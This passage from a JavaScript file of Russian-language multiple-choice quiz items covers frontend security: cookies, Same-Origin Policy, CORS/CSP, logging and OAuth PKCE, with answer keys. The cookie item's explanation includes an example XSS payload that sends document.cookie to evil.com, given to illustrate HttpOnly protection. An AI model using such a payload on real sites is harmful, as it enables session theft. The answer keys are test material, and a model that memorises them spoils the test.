          explanation: 'Компромиссы: localStorage: + бессрочное хранение, + простой API, − XSS = полный доступ. sessionStorage: + только текущая вкладка, − XSS всё равно опасен в текущей вкладке. HttpOnly cookie: + JS не видит (XSS не украдёт), − автоматическая отправка → CSRF (решается SameSite). Лучшая практика: access token в JavaScript-переменной (не переживает refresh страницы, но безопасно), refresh token в HttpOnly+Secure+SameSite=Strict cookie. При перезагрузке: silent refresh через refresh token → новый access token.',
        },
        // ✅ Theory #211 — Мониторинг ошибок
        {
          type: 'multiple-choice',
          question: 'Какие инструменты используются для мониторинга ошибок в frontend-приложениях (Sentry, LogRocket, TrackJS, Firebase Crashlytics)? Какие у них есть риски с точки зрения безопасности и приватности?',
          options: [
            'Мониторинг ошибок не нужен — достаточно console.log в production',
            'Инструменты: Sentry (перехват ошибок + stack trace), LogRocket (запись сессий), TrackJS (мониторинг JS-ошибок), Firebase Crashlytics (crash-отчёты). Риски: (1) могут захватывать PII (имена, email в DOM), (2) session replay может записать пароли, (3) stack traces раскрывают архитектуру. Меры: фильтрация PII, маскирование sensitive-полей, ограничение retention',
            'Все эти инструменты идентичны — разницы нет',
            'Мониторинг ошибок опасен — лучше не использовать',
          ],
          correctIndex: 1,
          explanation: 'Sentry: перехватывает window.onerror и unhandledrejection → отправляет stack trace, breadcrumbs, context → dashboard с группировкой ошибок. LogRocket: записывает DOM-мутации как «видео» сессии → можно воспроизвести действия пользователя перед ошибкой. Риски безопасности: (1) PII в ошибках: "User john@mail.com not found" → Sentry сохраняет email. (2) Session replay: LogRocket записывает ввод в поля → может записать пароль. (3) Source maps: stack trace с исходным кодом → раскрытие архитектуры. Меры: beforeSend фильтрация, маскирование input[type=password], не загружать source maps в production.',
        },
        // ✅ Theory #212 — Same-Origin Policy
        {
          type: 'multiple-choice',
          question: 'Объясните политику Same-Origin Policy и её значение для безопасности веба.',
          options: [
            'SOP — это политика кеширования в CDN',
            'Same-Origin Policy (SOP) — политика браузера, запрещающая скриптам с одного origin (протокол+домен+порт) получать доступ к ресурсам другого origin. Пример: https://a.com не может читать ответы fetch с https://b.com. Значение: изолирует сайты друг от друга — скрипт evil.com не может прочитать cookies/DOM bank.com. CORS — контролируемое ослабление SOP',
            'SOP работает только для cookies, не для fetch-запросов',
            'SOP — устаревшая политика, заменённая CSP',
          ],
          correctIndex: 1,
          explanation: 'Same-Origin Policy: origin = протокол + домен + порт. https://a.com:443 и https://a.com:443 → same origin ✓. https://a.com и http://a.com → разный протокол ✗. https://a.com и https://b.com → разный домен ✗. https://a.com и https://a.com:8080 → разный порт ✗. SOP запрещает: JS на a.com не может читать DOM/cookies/ответы fetch с b.com. Без SOP: любой сайт мог бы читать вашу банковскую страницу через iframe. CORS — сервер ЯВНО разрешает доступ с определённых origin.',
        },
        // ✅ Theory #213 — Cookie и безопасность
        {
          type: 'multiple-choice',
          question: 'Каким образом cookie могут скомпрометировать безопасность и как снизить эти риски?',
          options: [
            'Cookies полностью безопасны и не могут быть украдены',
            'Угрозы: (1) XSS → кража cookie через document.cookie (защита: HttpOnly), (2) перехват по HTTP (защита: Secure), (3) CSRF → автоматическая отправка cookie (защита: SameSite), (4) чрезмерный срок действия (защита: разумный Max-Age), (5) tracking cookies (защита: Referrer-Policy). Комплекс флагов: HttpOnly; Secure; SameSite=Strict; Path=/; Max-Age=3600',
            'Cookies безопасны, если просто использовать HTTPS',
            'Cookies не используются в современных приложениях — заменены JWT',
          ],
          correctIndex: 1,
          explanation: 'Cookie-угрозы: (1) XSS: <script>fetch("evil.com?c="+document.cookie)</script> → кража session. Защита: HttpOnly → JS не видит cookie. (2) MITM: перехват по HTTP. Защита: Secure → только HTTPS. (3) CSRF: evil.com отправляет запрос на bank.com, cookie прикрепляется автоматически. Защита: SameSite=Strict. (4) Session fixation: атакующий навязывает session ID. Защита: ротация session ID после логина. (5) Cookie scope: Path=/ → cookie доступна всему сайту. Ограничивать Path по необходимости.',
        },
        // ✅ Theory #215 — CORS, SOP и CSP с точки зрения безопасности
        {
          type: 'multiple-choice',
          question: 'Объясните CORS, SOP и CSP с точки зрения безопасности.',
          options: [
            'Все три — разные названия одного и того же механизма',
            'SOP (Same-Origin Policy) — базовая политика браузера: изолирует origin друг от друга. CORS — контролируемое ослабление SOP: сервер разрешает доступ конкретным origin через заголовки. CSP — дополнительный слой: контролирует какие ресурсы (скрипты, стили, шрифты) может загружать страница. Вместе: SOP (изоляция) → CORS (контролируемый доступ) → CSP (контроль ресурсов)',
            'SOP защищает от XSS, CORS от CSRF, CSP от clickjacking',
            'Все три механизма настраиваются только на клиенте',
          ],
          correctIndex: 1,
          explanation: 'SOP: фундамент — скрипт на a.com не может читать данные b.com. CORS: ослабление SOP — сервер b.com отвечает Access-Control-Allow-Origin: https://a.com → браузер разрешает. Без CORS: API на api.example.com недоступен для frontend на app.example.com. CSP: Content-Security-Policy: script-src \'self\' → даже если XSS внедрил <script src="evil.com/hack.js">, браузер заблокирует. Каждый решает свою задачу: SOP = изоляция, CORS = контролируемый обмен, CSP = контроль загружаемых ресурсов.',
        },
        // ✅ Theory #216 — Безопасная обработка ошибок
        {
          type: 'multiple-choice',
          question: 'Как организовать безопасную обработку ошибок и логирование в приложении?',
          options: [
            'Выводить подробные ошибки пользователю — чем больше деталей, тем лучше',
            'Правила: (1) пользователю — общее сообщение (\"Произошла ошибка\"), НЕ stack trace и SQL-запросы, (2) в логах — полная информация, но БЕЗ паролей/токенов/PII, (3) structured logging (JSON-формат для машинного анализа), (4) уровни логирования (error/warn/info/debug), (5) централизованный сбор (Sentry, ELK), (6) ротация и retention логов',
            'Достаточно console.log и try/catch — структура не важна',
            'Логирование на frontend не нужно — всё логируется на сервере',
          ],
          correctIndex: 1,
          explanation: 'Безопасная обработка: (1) User-facing: «Что-то пошло не так. Попробуйте позже.» — НЕ показывать: stack trace (раскрывает архитектуру), SQL-ошибки (раскрывают схему БД), пути файлов. (2) Логи: записывать ошибку, request context, user ID — НЕ записывать: пароли, токены, номера карт. (3) Фильтрация PII: в Sentry beforeSend: удалять email/phone из event data. (4) Structured logging: {level: "error", message: "Payment failed", orderId: 123, timestamp: "..."} → машинный анализ в ELK/Grafana. (5) Alert-ы: настроить уведомления при всплеске ошибок.',
        },
        // ✅ Theory #217 — Безопасное логирование без раскрытия данных
        {
          type: 'multiple-choice',
          question: 'Как обеспечить безопасное логирование и мониторинг без раскрытия чувствительных данных?',
          options: [
            'Логировать всё — чем больше данных, тем лучше для отладки',
            'Методы: (1) маскирование PII (email → j***@mail.com, карта → ****1234), (2) фильтрация в Sentry beforeSend — удалять sensitive fields, (3) не логировать Authorization header и пароли, (4) source maps только в staging (не в production), (5) session replay — маскирование input[type=password], (6) разграничение доступа к логам (RBAC)',
            'Безопасное логирование невозможно — всегда будут утечки',
            'Достаточно шифровать логи — содержимое не важно',
          ],
          correctIndex: 1,
          explanation: 'Практики: (1) Маскирование: в beforeSend Sentry: event.request.headers = redact(headers, ["Authorization", "Cookie"]). (2) PII-фильтр: email → первая буква + *** + @domain. (3) Source maps: в production Sentry получает source maps через upload (не публичный URL), обфусцированный стек в ошибках. (4) LogRocket/session replay: CSS-класс .lr-hide маскирует содержимое элемента. input[type=password] маскируется автоматически. (5) Log retention: хранить логи 30-90 дней, потом удалять. (6) Access control: не все разработчики видят логи с PII.',
        },
        // ✅ Theory #218 — OAuth 2.0 Authorization Code Flow с PKCE
        {
          type: 'multiple-choice',
          question: 'Опишите OAuth 2.0 Authorization Code Flow с PKCE для Single Page Application. Зачем нужен PKCE и как защищает SPA?',
          options: [
            'PKCE — это дополнительная библиотека, которую нужно установить на сервер',
            'Authorization Code Flow с PKCE: (1) SPA генерирует code_verifier (случайная строка) и code_challenge (SHA256 от verifier), (2) редирект на авторизацию с code_challenge, (3) пользователь логинится, (4) провайдер возвращает authorization code, (5) SPA обменивает code + code_verifier на tokens. PKCE защищает: SPA не может хранить client_secret → PKCE заменяет его, перехват code бесполезен без verifier',
            'PKCE нужен только для мобильных приложений, не для SPA',
            'PKCE — это протокол шифрования для WebSocket',
          ],
          correctIndex: 1,
          explanation: 'Зачем PKCE: в обычном Authorization Code Flow бэкенд обменивает code на token используя client_secret. SPA не может хранить client_secret (код в браузере = публичный). Без PKCE: перехватив code из URL, злоумышленник получает tokens. С PKCE: (1) SPA создаёт code_verifier (случайная строка 43-128 символов), (2) code_challenge = SHA256(code_verifier), (3) отправляет code_challenge при авторизации, (4) при обмене code→token отправляет code_verifier, (5) сервер проверяет: SHA256(verifier) === challenge. Перехват code бесполезен без verifier, который остаётся в памяти SPA.',
        },
      ],
    },
  ],
};
